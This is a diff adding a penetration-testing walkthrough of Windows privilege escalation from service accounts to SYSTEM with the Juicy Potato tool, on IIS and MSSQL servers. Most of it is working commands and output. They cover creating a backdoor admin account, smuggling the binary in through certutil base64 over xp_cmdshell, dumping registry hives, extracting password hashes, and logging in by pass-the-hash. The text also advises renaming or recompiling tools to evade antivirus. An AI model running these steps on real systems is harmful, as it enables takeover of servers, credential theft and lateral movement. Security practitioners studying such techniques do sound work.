@@ -1,0 +1,270 @@
+Local Privilege Escalation from a Windows Service account to 'NT AUTHORITY\SYSTEM' using the Juicy Potato technique
+===================================================================================================================
+
+During penetration tests, very often after uploading a webshell, finding an RCE or SQL database credentials with sysdba privileges we can run OS commands as:
+ - NT AUTHORITY\NETWORK SERVICE
+ - NT AUTHORITY\LOCAL SERVICE
+ - IIS APPOOL\ASP.NET V5.0
+ - COMPUTERNAME\IUSR_COMPUTERNAME
+ - ...
+ 
+Most of the time these service accounts have the 'SeImpersonate' or 'SeAssignPrimaryToken' privileges that can be used to escalate our privileges to become local admnistrator.
+
+For the last few years I have been using the tool 'https://github.com/ohpe/juicy-potato/' that is working well and is very stable. 
+You have to compile it and as usual it is recommended to rename somme stuff in the code to modify the signature of the file and avoid being detected by AntiVirus. 
+
+Example : 
+./juicy-jfc.exe 
+  Wrong Argument: -
+  Juicy-JFC v0.1
+
+  Mandatory args:
+  -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
+  -p <program>: program to launch
+  -l <port>: COM server listen port
+
+  Optional args:
+  -m <ip>: COM server listen address (default 127.0.0.1)
+  -a <argument>: command line argument to pass to program (default NULL)
+  -k <ip>: RPC server ip address (default 127.0.0.1)
+  -n <port>: RPC server listen port (default 135)
+  -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+  -z only test CLSID and print token's user
+
+
+Juicy Potato is "a sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM"
+
+More details and explanations can be find here: https://github.com/ohpe/juicy-potato/
+
+
+Example 1 - Local privesc with a reverse shell running as "NT AUTHORITY\NETWORK SERVICE" on a Windows Server 2016 Standard
+===========================================================================================================================
+
+> PS C:\Users\Public\Documents> SYSTEMINFO
+
+Host Name:                 Web-test-server01
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+<SNIP>
+
+
+> PS C:\Users\Public\Documents> WHOAMI /PRIV
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+==> First we test the local privilege escalation without indicating a CLSID (so the one by default '{4991d34b-80a1-4291-83b6-3328366b9097}' will be tested). 
+    
+> PS C:\Users\Public\Documents> ./juicy-jfc.exe -l 8888 -p c:\Windows\System32\whoami.exe -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 8888
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[+] CreateProcessWithTokenW OK
+
+
+==> The exploit is working !!
+    We can use it to create a new local Windows account and then add it in the local group 'Administrators'.
+
+> PS C:\Users\Public\Documents> ./juicy-jfc.exe -l 8888 -p c:\Windows\System32\net.exe -a 'user pentester Pa$$w0rd1_! /add' -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 8888
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[+] CreateProcessWithTokenW OK
+
+
+> PS C:\Users\Public\Documents> net user
+
+User accounts for \\Web-test-server01
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+pentester
+The command completed successfully.
+
+
+> PS C:\Users\Public\Documents> ./juicy-jfc.exe -l 8888 -p c:\Windows\System32\net.exe -a 'localgroup Administrators pentester /add' -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 8888
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[+] CreateProcessWithTokenW OK
+
+
+> PS C:\Users\Public\Documents> net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+Security-Test-Lab\webadmin
+Security-Test-Lab\Domain Admins
+pentester
+The command completed successfully.
+
+
+==> Now we can log into the target server as a local administrator using the account 'pentester' (e.g. RDP, wmiexec, Powershell Remoting, PSexec)
+
+
+Example 2 - Local privesc with a DBA account that can run commands as "NT AUTHORITY\NETWORK SERVICE" using xp_cmdshell on a MSSQL DB server running on a Windows Server 2008 R2
+================================================================================================================================================================================
+
+> EXEC master..xp_cmdshell 'systeminfo'
+
+Host Name : SQLserver04
+OS Name: Microsoft Windows Server 2008 R2 Enterprise 
+OS Version: 6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer: Microsoft Corporation
+OS Configuration: Standalone Server
+OS Build Type: Multiprocessor Free
+<SNIP>
+
+
+> EXEC master..xp_cmdshell 'whoami'
+
+NT AUTHORITY\NETWORK SERVICE
+
+
+> EXEC master..xp_cmdshell 'whoami -priv'
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+
+
+==> To perform the privesc we need to upload the tool 'juicy_jfc.exe' on the target server.
+
+  Step 1 - Use the native Windows command 'Certutil' to encode in base 64 the binary 'juicy_jfc.exe'  
+  > Certutil.exe -encode juicy_jfc.exe juicy_jfc_base64.txt
+
+  Step 2 - Write the base 64 file on the target server using the commands below: 
+  <SNIP>
+  > EXEC master..xp_cmdshell 'echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\temp\1.txt'
+  > EXEC master..xp_cmdshell 'echo AAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> c:\temp\1.txt'
+  <snip>
+
+  Step 3 - Finally use 'Certutil' on the target server to decode the base 64 text file and 'reconstruct' the binary 'juicy_jfc.exe'.
+  > EXEC master..xp_cmdshell 'Certutil.exe -decode C:\temp\1.txt  C:\temp\juicy_jfc.exe'
+  Input Lenght = 474264
+  Output Lenght = 342187
+  Certutil: -decode command completed successfully
+
+
+==> Now we can use the binary to perform the local privilege escalation. 
+    We can choose the CLSID {752073A2-23F2-4396-85F0-8FDB879ED0ED} (Source: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)
+
+> EXEC master..xp_cmdshell 'c:\temp\juicy_jfc.exe -l 8888 -p c:\Windows\System32\whoami.exe -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+
+Testing {752073A1-23F2-4396-85F0-8FDB879ED0ED} 8888
+......
+[+] authresult 0
+{752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
+[-] CreateProcessWithTokenW Failed to create proc: 1058
+[+] CreateProcessAsUser OK
+
+NT AUTHORITY\SYSTEM
+
+==> The exploit is working !!
+    We can dump the registry keys 'HKLM\SAM', 'HKLM\SECURITY' and 'HKLM\SYSTEM' (the objective is to extract later the password hashes of the local Windows accounts).
+
+> EXEC master..xp_cmdshell 'c:\temp\juicy_jfc.exe -l 8888 -p c:\Windows\System32\reg.exe -a "SAVE HKLM\SAM C:\temp\sam.hive" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+
+Testing {752073A1-23F2-4396-85F0-8FDB879ED0ED} 8888
+......
+[+] authresult 0
+{752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
+[-] CreateProcessWithTokenW Failed to create proc: 1058
+[+] CreateProcessAsUser OK
+The operation completed successfully.
+
+
+> EXEC master..xp_cmdshell 'c:\temp\juicy_jfc.exe -l 8888 -p c:\Windows\System32\reg.exe -a "SAVE HKLM\SYSTEM C:\temp\system.hive " -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+
+Testing {752073A1-23F2-4396-85F0-8FDB879ED0ED} 8888
+......
+[+] authresult 0
+{752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
+[-] CreateProcessWithTokenW Failed to create proc: 1058
+[+] CreateProcessAsUser OK
+The operation completed successfully.
+
+
+> EXEC master..xp_cmdshell 'c:\temp\juicy_jfc.exe -l 8888 -p c:\Windows\System32\reg.exe -a "SAVE HKLM\SECURITY C:\temp\security.hive" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+
+Testing {752073A1-23F2-4396-85F0-8FDB879ED0ED} 8888
+......
+[+] authresult 0
+{752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
+[-] CreateProcessWithTokenW Failed to create proc: 1058
+[+] CreateProcessAsUser OK
+The operation completed successfully.
+
+
+> EXEC master..xp_cmdshell 'dir c:\temp\'
+
+Volume in drive C is SYSTEM
+Volume Serial Number is E8FB-2660
+Directory of c:\temp
+01/16/2020 08:50 AM
+.
+01/16/2020 08:50 AM
+..
+01/16/2020 08:28 AM 8,326,759 1.txt
+01/16/2020 08:35 AM 342,016 juicy_jfc.exe
+01/16/2020 08:46 AM 57,344 sam.hive
+01/16/2020 08:50 AM 36,864 security.hive
+01/16/2020 08:48 AM 11,108,352 system.hive
+<SNIP>
+
+
+==> We upload on the target server the binary secretsdump_jfc.exe (tool from Impacket that I modified and re-compiled to avoid AV). Note: we can use the same technique than before with Certutil.
+    Then we use secretsdump to extract the local password hashes (the objective is to be able to log into the target server as a local admin using wmiexec (Pass-The-Hash)).
+    
+> EXEC master..xp_cmdshell 'c:\temp\secretsdump_jfc.exe -sam c:\temp\sam.hive -security c:\temp\security.hive -system c:\temp\system.hive LOCAL'
+
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+[*] Target system bootKey: 0x8127d63e275a8a31a4d<SNIP>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+localadm:500:aad3b435b51404eeaad3b435b51404ee:6e9456cb<SNIP>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:3798c13b7<SNIP>
+admin:1001:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0<SNIP>
+<SNIP>
+
+
+==> Clean-up
+
+> EXEC master..xp_cmdshell 'c:\temp\audit_jfc.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\sam.hive" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+> EXEC master..xp_cmdshell 'c:\temp\audit_j.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\system.hive" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+> EXEC master..xp_cmdshell 'c:\temp\audit_j.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\security.hive" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+> EXEC master..xp_cmdshell 'c:\temp\audit_j.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\secretsdump_jfc.exe" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+> EXEC master..xp_cmdshell 'c:\temp\audit_jfc.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\1.txt" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+> EXEC master..xp_cmdshell 'c:\temp\audit_jfc.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\audit_jfc.exe" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+
+
+==> We log into the target server as a local adminitrator using the account 'admin' and wmiexec from impacket.
+
+> $ python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0<SNIP> admin@SQLserver04
+
